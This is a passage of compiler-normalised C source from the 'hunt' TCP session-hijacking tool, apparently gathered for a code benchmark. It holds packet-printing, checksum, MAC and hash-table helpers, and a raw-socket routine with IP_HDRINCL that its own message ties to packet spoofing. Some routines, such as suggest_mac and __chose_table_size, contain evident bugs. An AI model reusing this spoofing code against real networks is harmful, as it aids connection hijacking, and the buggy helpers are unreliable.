extern int putchar(int __c ) ;
#line 689
extern int fputs(char const   * __restrict  __s , FILE * __restrict  __stream ) ;
#line 366 "/usr/include/unistd.h"
extern ssize_t write(int __fd , void const   *__buf , size_t __n ) ;
#line 79 "/usr/include/ctype.h"
extern  __attribute__((__nothrow__)) unsigned short const   **( __attribute__((__leaf__)) __ctype_b_loc)(void)  __attribute__((__const__)) ;
#line 42 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void print_colors(void) 
{ 
  int i ;

  {
#line 46
  i = 0;
  {
#line 46
  while (1) {
    while_continue: /* CIL Label */ ;
#line 46
    if (! (i < 16)) {
#line 46
      goto while_break;
    }
    {
#line 47
    set_tty_color((enum TTY_COLOR )i);
#line 48
    printf((char const   */* __restrict  */)"%d Hi\n", i);
#line 46
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 50
  return;
}
}
#line 52 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void set_tty_color(enum TTY_COLOR color ) 
{ 


  {
  {
#line 54
  set_tty_color_bg(color, (enum TTY_COLOR )0);
  }
#line 55
  return;
}
}
#line 57 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void set_tty_color_bg(enum TTY_COLOR fg , enum TTY_COLOR bg ) 
{ 
  char buf[32] ;

  {
  {
#line 61
  sprintf((char */* __restrict  */)(buf), (char const   */* __restrict  */)"\033[%d;4%d;3%dm",
          (unsigned int )fg / 8U, (unsigned int )bg % 8U, (unsigned int )fg % 8U);
#line 62
  fputs((char const   */* __restrict  */)(buf), (FILE */* __restrict  */)stdout);
  }
#line 63
  return;
}
}
#line 65 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int is_power2(unsigned int i ) 
{ 
  int tmp ;

  {
  {
#line 67
  while (1) {
    while_continue: /* CIL Label */ ;
#line 67
    if (! (! (i & 1U))) {
#line 67
      goto while_break;
    }
#line 68
    i >>= 1;
  }
  while_break: /* CIL Label */ ;
  }
#line 69
  i >>= 1;
#line 70
  if (i) {
#line 70
    tmp = 0;
  } else {
#line 70
    tmp = 1;
  }
#line 70
  return (tmp);
}
}
#line 73 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int log2(unsigned int i ) 
{ 
  int l ;

  {
#line 75
  l = 0;
#line 77
  if (! i) {
#line 78
    return (-1);
  }
  {
#line 79
  while (1) {
    while_continue: /* CIL Label */ ;
#line 79
    if (! (! (i & 1U))) {
#line 79
      goto while_break;
    }
#line 80
    l ++;
#line 81
    i >>= 1;
  }
  while_break: /* CIL Label */ ;
  }
#line 83
  i >>= 1;
#line 84
  if (i) {
#line 85
    return (0);
  } else {
#line 87
    return (l);
  }
}
}
#line 90 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int count_mask(unsigned int mask ) 
{ 
  int retval ;

  {
#line 94
  retval = 0;
  {
#line 95
  while (1) {
    while_continue: /* CIL Label */ ;
#line 95
    if (! mask) {
#line 95
      goto while_break;
    }
#line 96
    if (mask & 1U) {
#line 97
      retval ++;
    }
#line 98
    mask >>= 1;
  }
  while_break: /* CIL Label */ ;
  }
#line 100
  return (retval);
}
}
#line 105 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
static unsigned int hsrc_seq_done  ;
#line 106 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
static unsigned int hdst_seq_done  ;
#line 103 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void print_data_packet(struct packet *p , int data_len , int count___0 , int dst_packet ) 
{ 
  int data_start ;
  int i ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  unsigned short const   **tmp___1 ;
  unsigned short const   **tmp___2 ;
  unsigned short const   **tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;

  {
#line 110
  data_start = 0;
#line 119
  if (count___0 > 1) {
#line 120
    if (dst_packet) {
      {
#line 121
      tmp = ntohl((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.seq);
#line 121
      data_start = (int )(hdst_seq_done - tmp);
      }
    } else {
      {
#line 123
      tmp___0 = ntohl((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.seq);
#line 123
      data_start = (int )(hsrc_seq_done - tmp___0);
      }
    }
#line 124
    if (data_start < 0) {
#line 125
      data_start = 0;
    }
  }
#line 127
  if (! dst_packet) {
    {
#line 128
    set_tty_color((enum TTY_COLOR )2);
    }
  }
#line 129
  i = data_start;
  {
#line 129
  while (1) {
    while_continue: /* CIL Label */ ;
#line 129
    if (! (i < data_len)) {
#line 129
      goto while_break;
    }
#line 130
    if ((int )*(p->p_data + i) == 13) {
#line 130
      if (i + 1 < data_len) {
#line 130
        if ((int )*(p->p_data + (i + 1)) != 10) {
          {
#line 132
          putchar('\n');
          }
        } else {
#line 130
          goto _L___0;
        }
      } else {
#line 130
        goto _L___0;
      }
    } else {
      _L___0: /* CIL Label */ 
      {
#line 134
      tmp___1 = __ctype_b_loc();
      }
#line 134
      if ((int const   )*(*tmp___1 + (int )*(p->p_data + i)) & 16384) {
        {
#line 136
        putchar((int )*(p->p_data + i));
        }
      } else {
        {
#line 134
        tmp___2 = __ctype_b_loc();
        }
#line 134
        if ((int const   )*(*tmp___2 + (int )*(p->p_data + i)) & 8192) {
          {
#line 136
          putchar((int )*(p->p_data + i));
          }
        } else
#line 134
        if (print_cntrl_chars) {
          {
#line 134
          tmp___3 = __ctype_b_loc();
          }
#line 134
          if ((int const   )*(*tmp___3 + (int )*(p->p_data + i)) & 2) {
            {
#line 136
            putchar((int )*(p->p_data + i));
            }
          } else
#line 134
          if ((int )*(p->p_data + i) == 27) {
            {
#line 136
            putchar((int )*(p->p_data + i));
            }
          } else {
            {
#line 138
            printf((char const   */* __restrict  */)"<%X>", (unsigned int )((unsigned char )*(p->p_data + i)));
            }
          }
        } else {
          {
#line 138
          printf((char const   */* __restrict  */)"<%X>", (unsigned int )((unsigned char )*(p->p_data + i)));
          }
        }
      }
    }
#line 129
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 142
  if (! dst_packet) {
    {
#line 143
    set_tty_color((enum TTY_COLOR )7);
    }
  }
  {
#line 144
  fflush(stdout);
  }
#line 146
  if (count___0) {
#line 146
    if (data_start <= data_len) {
#line 147
      if (dst_packet) {
        {
#line 148
        tmp___4 = ntohl((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.seq);
#line 148
        hdst_seq_done = tmp___4 + (uint32_t )data_len;
        }
      } else {
        {
#line 150
        tmp___5 = ntohl((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.seq);
#line 150
        hsrc_seq_done = tmp___5 + (uint32_t )data_len;
        }
      }
    }
  }
#line 152
  return;
}
}
#line 154 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void print_data(char *label , void *data , int len ) 
{ 
  int i ;

  {
  {
#line 158
  printf((char const   */* __restrict  */)"%s: ", label);
#line 159
  i = 0;
  }
  {
#line 159
  while (1) {
    while_continue: /* CIL Label */ ;
#line 159
    if (! (i < len)) {
#line 159
      goto while_break;
    }
    {
#line 160
    printf((char const   */* __restrict  */)"%X ", (int )*((unsigned char *)data + i));
#line 159
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 162
  printf((char const   */* __restrict  */)"\n");
  }
#line 163
  return;
}
}
#line 166 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
unsigned short ip_in_cksum(struct iphdr *iph , unsigned short *ptr , int nbytes ) 
{ 
  register long sum ;
  u_short oddbyte ;
  int pheader_len ;
  unsigned short *pheader_ptr ;
  struct pseudo_header pheader ;
  unsigned short *tmp ;
  unsigned short *tmp___0 ;

  {
  {
#line 169
  sum = 0L;
#line 182
  pheader.saddr = (unsigned long )iph->saddr;
#line 183
  pheader.daddr = (unsigned long )iph->daddr;
#line 184
  pheader.null = (unsigned char)0;
#line 185
  pheader.proto = iph->protocol;
#line 186
  pheader.tlen = htons((uint16_t )nbytes);
#line 188
  pheader_ptr = (unsigned short *)(& pheader);
#line 189
  pheader_len = (int )sizeof(pheader);
  }
  {
#line 189
  while (1) {
    while_continue: /* CIL Label */ ;
#line 189
    if (! pheader_len) {
#line 189
      goto while_break;
    }
#line 190
    tmp = pheader_ptr;
#line 190
    pheader_ptr ++;
#line 190
    sum += (long )*tmp;
#line 189
    pheader_len -= 2;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 192
  while (1) {
    while_continue___0: /* CIL Label */ ;
#line 192
    if (! (nbytes > 1)) {
#line 192
      goto while_break___0;
    }
#line 193
    tmp___0 = ptr;
#line 193
    ptr ++;
#line 193
    sum += (long )*tmp___0;
#line 194
    nbytes -= 2;
  }
  while_break___0: /* CIL Label */ ;
  }
#line 196
  if (nbytes == 1) {
#line 197
    oddbyte = (u_short )0;
#line 198
    *((u_char *)(& oddbyte)) = *((u_char *)ptr);
#line 199
    sum += (long )oddbyte;
  }
#line 201
  sum = (sum >> 16) + (sum & 65535L);
#line 202
  return ((unsigned short )(~ (sum + (sum >> 16)) & 65535L));
}
}
#line 205 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
unsigned short in_cksum(unsigned short *ptr , int nbytes ) 
{ 
  register long sum ;
  u_short oddbyte ;
  unsigned short *tmp ;

  {
#line 207
  sum = 0L;
  {
#line 210
  while (1) {
    while_continue: /* CIL Label */ ;
#line 210
    if (! (nbytes > 1)) {
#line 210
      goto while_break;
    }
#line 211
    tmp = ptr;
#line 211
    ptr ++;
#line 211
    sum += (long )*tmp;
#line 212
    nbytes -= 2;
  }
  while_break: /* CIL Label */ ;
  }
#line 214
  if (nbytes == 1) {
#line 215
    oddbyte = (u_short )0;
#line 216
    *((u_char *)(& oddbyte)) = *((u_char *)ptr);
#line 217
    sum += (long )oddbyte;
  }
#line 219
  sum = (sum >> 16) + (sum & 65535L);
#line 220
  return ((unsigned short )(~ (sum + (sum >> 16)) & 65535L));
}
}
#line 223 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int sprintf_eth_mac(char *b , unsigned char *mac ) 
{ 
  int tmp ;

  {
  {
#line 225
  tmp = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"%02X:%02X:%02X:%02X:%02X:%02X",
                (int )*(mac + 0), (int )*(mac + 1), (int )*(mac + 2), (int )*(mac + 3),
                (int )*(mac + 4), (int )*(mac + 5));
  }
#line 225
  return (tmp);
}
}
#line 229 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int print_eth_mac(unsigned char *mac ) 
{ 
  char buf[64] ;
  int tmp ;

  {
  {
#line 233
  sprintf_eth_mac(buf, mac);
#line 234
  tmp = printf((char const   */* __restrict  */)"%s", buf);
  }
#line 234
  return (tmp);
}
}
#line 237 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int rawsock(void) 
{ 
  int fd ;
  int val ;
  int tmp ;

  {
  {
#line 239
  val = 1;
#line 241
  fd = socket(2, 3, 255);
  }
#line 241
  if (fd < 0) {
#line 242
    if (verbose) {
      {
#line 243
      perror("\n(rawsock) Socket problems [fatal]");
      }
    }
    {
#line 244
    exit(1);
    }
  }
  {
#line 248
  tmp = setsockopt(fd, 0, 3, (void const   *)(& val), (socklen_t )sizeof(val));
  }
#line 248
  if (tmp < 0) {
#line 249
    if (verbose) {
      {
#line 250
      perror("Cannot set IP_HDRINCL socket option");
#line 251
      fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"\nIf you are relying on this rather then a hacked kernel to spoof packets, your sunk.\n[cr]");
#line 252
      getchar();
      }
    }
  }
#line 256
  return (fd);
}
}
#line 280 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int sprintf_db_ports(unsigned int *ports , char *buf , int buf_size , int all ) 
{ 
  char *buf_orig ;
  int i ;
  int tmp ;
  char *tmp___0 ;
  char *tmp___1 ;
  int tmp___2 ;
  char *tmp___3 ;
  int tmp___4 ;

  {
#line 285
  buf_orig = buf;
#line 286
  if (*(ports + 0) == 0U) {
#line 287
    if (all) {
      {
#line 288
      tmp = sprintf((char */* __restrict  */)buf, (char const   */* __restrict  */)"all");
#line 288
      buf += tmp;
      }
    }
#line 289
    return ((int )(buf - buf_orig));
  }
#line 291
  i = 0;
  {
#line 291
  while (1) {
    while_continue: /* CIL Label */ ;
#line 291
    if (! *(ports + i)) {
#line 291
      goto while_break;
    }
#line 292
    if (*(ports + i) & (unsigned int )(1 << 16)) {
      {
#line 294
      tmp___0 = port_lookup((unsigned short )*(ports + (i + 1)), hl_mode);
#line 294
      tmp___1 = port_lookup((unsigned short )(*(ports + i) & 65535U), hl_mode);
#line 294
      tmp___2 = sprintf((char */* __restrict  */)buf, (char const   */* __restrict  */)"%s:%s ",
                        tmp___1, tmp___0);
#line 294
      buf += tmp___2;
#line 297
      i ++;
      }
    } else {
      {
#line 300
      tmp___3 = port_lookup((unsigned short )*(ports + i), hl_mode);
#line 300
      tmp___4 = sprintf((char */* __restrict  */)buf, (char const   */* __restrict  */)"%s ",
                        tmp___3);
#line 300
      buf += tmp___4;
      }
    }
#line 291
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 302
  *(buf - 1) = (char)0;
#line 303
  return ((int )(buf - buf_orig));
}
}
#line 306 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int port_match(int port , unsigned int *db_ports ) 
{ 
  int start ;
  int end ;
  int pass ;
  int i ;
  uint16_t tmp ;
  uint16_t tmp___0 ;
  uint16_t tmp___1 ;
  uint16_t tmp___2 ;

  {
#line 312
  if (! *(db_ports + 0)) {
#line 313
    return (1);
  }
#line 314
  pass = 0;
#line 315
  i = 0;
  {
#line 315
  while (1) {
    while_continue: /* CIL Label */ ;
#line 315
    if (! *(db_ports + i)) {
#line 315
      goto while_break;
    }
#line 316
    if (*(db_ports + i) & (unsigned int )(1 << 16)) {
      {
#line 317
      tmp = ntohs((uint16_t )(*(db_ports + i) & 65535U));
#line 317
      start = (int )tmp;
#line 318
      i ++;
#line 318
      tmp___0 = ntohs((uint16_t )*(db_ports + i));
#line 318
      end = (int )tmp___0;
#line 319
      tmp___1 = ntohs((uint16_t )port);
      }
#line 319
      if (start <= (int )tmp___1) {
        {
#line 319
        tmp___2 = ntohs((uint16_t )port);
        }
#line 319
        if ((int )tmp___2 <= end) {
#line 320
          pass = 1;
#line 321
          goto while_break;
        }
      }
    } else
#line 323
    if ((unsigned int )port == *(db_ports + i)) {
#line 324
      pass = 1;
#line 325
      goto while_break;
    }
#line 315
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 328
  if (pass) {
#line 329
    return (1);
  } else {
#line 331
    return (0);
  }
}
}
#line 334 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void port_htons(unsigned int *db_ports ) 
{ 
  int i ;
  unsigned int upper ;
  uint16_t tmp ;

  {
#line 339
  i = 0;
  {
#line 339
  while (1) {
    while_continue: /* CIL Label */ ;
#line 339
    if (! *(db_ports + i)) {
#line 339
      goto while_break;
    }
    {
#line 340
    upper = *(db_ports + i) & 4294901760U;
#line 341
    tmp = htons((uint16_t )(*(db_ports + i) & 65535U));
#line 341
    *(db_ports + i) = upper | (unsigned int )tmp;
#line 339
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 343
  return;
}
}
#line 345 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
unsigned char __suggest_mac[6]  = {      (unsigned char)234,      (unsigned char)26,      (unsigned char)222,      (unsigned char)173, 
        (unsigned char)190,      (unsigned char)0};
#line 346 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
unsigned char *suggest_mac(void) 
{ 
  int i ;

  {
#line 350
  i = 5;
  {
#line 350
  while (1) {
    while_continue: /* CIL Label */ ;
#line 350
    if (! (i >= 0)) {
#line 350
      goto while_break;
    }
#line 351
    __suggest_mac[i] = (unsigned char )((int )__suggest_mac[i] + 1);
#line 351
    if ((int )__suggest_mac[i] != 0) {
#line 352
      goto while_break;
    }
#line 353
    __suggest_mac[i] = (unsigned char )((int )__suggest_mac[i] + 1);
#line 350
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 355
  return (__suggest_mac);
}
}
#line 358 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void ctrl_c_prompt(void) 
{ 


  {
  {
#line 360
  set_tty_color((enum TTY_COLOR )9);
#line 361
  printf((char const   */* __restrict  */)"CTRL-C to break\n");
#line 362
  set_tty_color((enum TTY_COLOR )7);
#line 363
  fflush(stdout);
  }
#line 364
  return;
}
}
#line 366 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
void clear_scr(void) 
{ 
  int i ;

  {
#line 370
  i = 0;
  {
#line 370
  while (1) {
    while_continue: /* CIL Label */ ;
#line 370
    if (! (i < 50)) {
#line 370
      goto while_break;
    }
    {
#line 371
    putchar('\n');
#line 370
    i ++;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 372
  return;
}
}
#line 374 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/util.c"
int writen(int fd , char *ptr , int nbytes ) 
{ 
  int nleft ;
  int nwritten ;
  ssize_t tmp ;

  {
#line 378
  nleft = nbytes;
  {
#line 379
  while (1) {
    while_continue: /* CIL Label */ ;
#line 379
    if (! (nleft > 0)) {
#line 379
      goto while_break;
    }
    {
#line 380
    tmp = write(fd, (void const   *)ptr, (size_t )nleft);
#line 380
    nwritten = (int )tmp;
    }
#line 381
    if (nwritten <= 0) {
#line 382
      return (nwritten);
    }
#line 384
    nleft -= nwritten;
#line 385
    ptr += nwritten;
  }
  while_break: /* CIL Label */ ;
  }
#line 387
  return (nbytes - nleft);
}
}
/* compiler builtin: 
   void *__builtin_alloca(unsigned long  ) ;  */
#line 50 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.h"
int hash_init(struct hash *h , int max_items , int (*eqfunc)(unsigned int key , void *data_ht ,
                                                             void *arg ) ) ;
#line 52
void *hash_get(struct hash *h , unsigned int key , void *arg ) ;
#line 53
void *hash_remove(struct hash *h , unsigned int key , void *arg ) ;
#line 54
int hash_put(struct hash *h , unsigned int key , void *data ) ;
#line 55
int hash_put_check(struct hash *h , unsigned int key , void *data , void *arg ) ;
#line 57
void hash_lock(struct hash *h ) ;
#line 58
void hash_unlock(struct hash *h ) ;
#line 59
int hash_count(struct hash *h ) ;
#line 61
void hash_free(struct hash *h ) ;
#line 66
void hash_iter_set(struct hash_iterator *i , struct hash *h ) ;
#line 67
void *hash_iter_get(struct hash_iterator *i , unsigned int *keyptr ) ;
#line 68
void hash_iter_end(struct hash_iterator *i ) ;
#line 70
void hash_iter_lock(struct hash_iterator *i ) ;
#line 71
void hash_iter_unlock(struct hash_iterator *i ) ;
#line 18 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static int __chose_table_size(int size ) ;
#line 18 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static int ht_size[44]  = 
#line 18
  {      37,      47,      79,      97, 
        163,      197,      331,      397, 
        673,      797,      1361,      1597, 
        2729,      3203,      5471,      6421, 
        10949,      12853,      21911,      25717, 
        43853,      51437,      87719,      102877, 
        175447,      205759,      350899,      411527, 
        701819,      823117,      1403641,      1646237, 
        2807303,      3292489,      5614657,      6584983, 
        11229331,      13169977,      22458671,      26339969, 
        44917381,      52679969,      89834777,      105359939};
#line 16 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static int __chose_table_size(int size ) 
{ 
  int i ;

  {
#line 28
  if (size >= ht_size[sizeof(ht_size) / sizeof(ht_size[0]) - 1UL]) {
#line 29
    return (ht_size[sizeof(ht_size) / sizeof(ht_size[0])]);
  }
#line 30
  i = 0;
  {
#line 30
  while (1) {
    while_continue: /* CIL Label */ ;
#line 30
    if (! (ht_size[i] < size)) {
#line 30
      goto while_break;
    }
#line 30
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 32
  return (ht_size[i]);
}
}
#line 35 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __when_need_space(int max_items ) 
{ 


  {
#line 37
  return ((80 * max_items) / 100);
}
}
#line 40 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __hash_need_space(struct hash *h ) 
{ 
  int tmp ;

  {
#line 42
  if (h->h_items >= h->h_space_after) {
#line 42
    tmp = 1;
  } else {
#line 42
    tmp = 0;
  }
#line 42
  return (tmp);
}
}
#line 46 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
int hash_init(struct hash *h , int max_items , int (*eqfunc)(unsigned int key , void *data_ht ,
                                                             void *arg ) ) 
{ 
  struct hash_table_item *tmp ;
  void *tmp___0 ;

  {
#line 48
  if (max_items < 131) {
#line 49
    max_items = 131;
  }
  {
#line 50
  max_items = __chose_table_size(max_items);
#line 51
  h->h_space_after = __when_need_space(max_items);
#line 52
  h->h_items = 0;
#line 53
  h->h_max_items = max_items;
#line 54
  h->h_eqfunc = eqfunc;
#line 55
  tmp___0 = malloc((unsigned long )max_items * sizeof(struct hash_table_item ));
#line 55
  tmp = (struct hash_table_item *)tmp___0;
#line 55
  h->h_table = tmp;
  }
#line 55
  if (! tmp) {
#line 56
    return (-1);
  }
  {
#line 57
  memset((void *)h->h_table, 0, (unsigned long )max_items * sizeof(struct hash_table_item ));
#line 59
  h->h_locked = 0;
#line 60
  pthread_mutex_init(& h->h_mutex, (pthread_mutexattr_t const   *)((void *)0));
  }
#line 62
  return (0);
}
}
#line 65 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_free(struct hash *h ) 
{ 


  {
#line 67
  if (h->h_table) {
    {
#line 68
    free((void *)h->h_table);
    }
  }
  {
#line 69
  memset((void *)h, 0, sizeof(*h));
  }
#line 70
  return;
}
}
#line 72 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static unsigned int __hv_hash  ;
#line 73 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static unsigned int __hv_hash_save  ;
#line 74 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static unsigned int __hv_max_items  ;
#line 80 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __hv(unsigned int key , unsigned int max_items ) 
{ 


  {
#line 82
  __hv_max_items = max_items;
#line 86
  __hv_hash = key % max_items;
#line 86
  return ((int )__hv_hash);
}
}
#line 89 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __hv_peek(void) 
{ 


  {
#line 91
  return ((int )__hv_hash);
}
}
#line 94 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __hv_next(void) 
{ 


  {
#line 101
  __hv_hash = (__hv_hash + 1U) % __hv_max_items;
#line 101
  return ((int )__hv_hash);
}
}
#line 105 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __hv_peek_next(void) 
{ 


  {
#line 110
  return ((int )((__hv_hash + 1U) % __hv_max_items));
}
}
#line 114 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static void __hv_save_position(void) 
{ 


  {
#line 119
  __hv_hash_save = __hv_hash;
#line 120
  return;
}
}
#line 122 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static int __hv_load_position(void) 
{ 


  {
#line 127
  __hv_hash = __hv_hash_save;
#line 127
  return ((int )__hv_hash);
}
}
#line 131 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static int __hash_find(struct hash *h , unsigned int key , void *arg ) 
{ 
  int retval ;
  int hv ;
  struct hash_table_item *h_table ;
  int tmp ;
  int tmp___0 ;

  {
  {
#line 137
  hv = __hv(key, (unsigned int )h->h_max_items);
#line 138
  h_table = h->h_table;
#line 139
  retval = -1;
  }
  {
#line 141
  while (1) {
    while_continue: /* CIL Label */ ;
#line 141
    if (! (h_table + hv)->ht_data) {
#line 141
      goto while_break;
    }
#line 142
    if ((h_table + hv)->ht_key == key) {
#line 143
      if (! h->h_eqfunc) {
#line 145
        retval = hv;
#line 146
        goto while_break;
      } else {
        {
#line 143
        tmp___0 = __hv_peek_next();
        }
#line 143
        if ((unsigned long )(h_table + tmp___0)->ht_data == (unsigned long )((void *)0)) {
#line 145
          retval = hv;
#line 146
          goto while_break;
        } else {
          {
#line 148
          tmp = (*(h->h_eqfunc))(key, (h_table + hv)->ht_data, arg);
          }
#line 148
          if (tmp) {
#line 149
            retval = hv;
#line 150
            goto while_break;
          }
        }
      }
    }
    {
#line 154
    hv = __hv_next();
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 156
  return (retval);
}
}
#line 159 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static void __hash_put(struct hash *h , unsigned int key , void *data ) 
{ 
  int hv ;
  struct hash_table_item *h_table ;

  {
  {
#line 164
  hv = __hv(key, (unsigned int )h->h_max_items);
#line 165
  h_table = h->h_table;
  }
  {
#line 167
  while (1) {
    while_continue: /* CIL Label */ ;
#line 167
    if (! (h_table + hv)->ht_data) {
#line 167
      goto while_break;
    }
    {
#line 168
    hv = __hv_next();
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 170
  (h_table + hv)->ht_key = key;
#line 171
  (h_table + hv)->ht_data = data;
#line 172
  (h->h_items) ++;
#line 173
  return;
}
}
#line 175 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static int __hash_put_check(struct hash *h , unsigned int key , void *data , void *arg ) 
{ 
  int retval ;
  int hv ;
  struct hash_table_item *h_table ;

  {
  {
#line 180
  h_table = h->h_table;
#line 182
  retval = __hash_find(h, key, arg);
  }
#line 183
  if (retval < 0) {
    {
#line 184
    hv = __hv_peek();
#line 185
    (h_table + hv)->ht_key = key;
#line 186
    (h_table + hv)->ht_data = data;
    }
#line 187
    return (0);
  } else {
#line 189
    return (-1);
  }
}
}
#line 192 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static void __hash_remap(struct hash *h , int hv ) 
{ 
  int count___0 ;
  int i ;
  struct hash_table_item *h_table ;
  struct hash_table_item *ht_save ;
  void *tmp ;

  {
  {
#line 197
  __hv_save_position();
#line 198
  h_table = h->h_table;
#line 199
  count___0 = 0;
  }
  {
#line 200
  while (1) {
    while_continue: /* CIL Label */ ;
#line 200
    if (! (h_table + hv)->ht_data) {
#line 200
      goto while_break;
    }
    {
#line 201
    count___0 ++;
#line 202
    hv = __hv_next();
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 204
  if (count___0) {
    {
#line 205
    tmp = __builtin_alloca((unsigned long )count___0 * sizeof(struct hash_table_item ));
#line 205
    ht_save = (struct hash_table_item *)tmp;
#line 206
    hv = __hv_load_position();
#line 207
    i = 0;
    }
    {
#line 208
    while (1) {
      while_continue___0: /* CIL Label */ ;
#line 208
      if (! (h_table + hv)->ht_data) {
#line 208
        goto while_break___0;
      }
      {
#line 209
      (ht_save + i)->ht_key = (h_table + hv)->ht_key;
#line 210
      (ht_save + i)->ht_data = (h_table + hv)->ht_data;
#line 211
      (h_table + hv)->ht_key = 0U;
#line 212
      (h_table + hv)->ht_data = (void *)0;
#line 213
      i ++;
#line 214
      hv = __hv_next();
      }
    }
    while_break___0: /* CIL Label */ ;
    }
#line 216
    h->h_items -= count___0;
#line 217
    i = 0;
    {
#line 217
    while (1) {
      while_continue___1: /* CIL Label */ ;
#line 217
      if (! (i < count___0)) {
#line 217
        goto while_break___1;
      }
      {
#line 218
      __hash_put(h, (ht_save + i)->ht_key, (ht_save + i)->ht_data);
#line 217
      i ++;
      }
    }
    while_break___1: /* CIL Label */ ;
    }
  }
#line 220
  return;
}
}
#line 222 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
static void __hash_new_space(struct hash *h ) 
{ 
  struct hash_table_item *old_h_table ;
  int old_items ;
  int old_max_items ;
  int i ;
  struct hash_table_item *tmp ;
  void *tmp___0 ;

  {
  {
#line 228
  old_items = h->h_items;
#line 229
  old_max_items = h->h_max_items;
#line 230
  old_h_table = h->h_table;
#line 232
  h->h_max_items = __chose_table_size(h->h_max_items + (100 * h->h_max_items) / 100);
#line 234
  tmp___0 = malloc((unsigned long )h->h_max_items * sizeof(struct hash_table_item ));
#line 234
  tmp = (struct hash_table_item *)tmp___0;
#line 234
  h->h_table = tmp;
  }
#line 234
  if (! tmp) {
#line 235
    h->h_items = old_items;
#line 236
    h->h_max_items = old_max_items;
#line 237
    h->h_table = old_h_table;
#line 238
    return;
  }
  {
#line 240
  h->h_space_after = __when_need_space(h->h_max_items);
#line 241
  memset((void *)h->h_table, 0, (unsigned long )h->h_max_items * sizeof(struct hash_table_item ));
#line 242
  h->h_items = 0;
#line 244
  i = 0;
  }
  {
#line 244
  while (1) {
    while_continue: /* CIL Label */ ;
#line 244
    if (! (i < old_max_items)) {
#line 244
      goto while_break;
    }
#line 245
    if ((old_h_table + i)->ht_data) {
      {
#line 246
      __hash_put(h, (old_h_table + i)->ht_key, (old_h_table + i)->ht_data);
      }
    }
#line 244
    i ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 248
  free((void *)old_h_table);
  }
#line 249
  return;
}
}
#line 251 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static void __lock___0(struct hash *h ) 
{ 
  pthread_t tmp ;

  {
#line 254
  if (! h->h_locked) {
    {
#line 255
    pthread_mutex_lock(& h->h_mutex);
    }
  } else {
    {
#line 254
    tmp = pthread_self();
    }
#line 254
    if (h->h_locked_thr != tmp) {
      {
#line 255
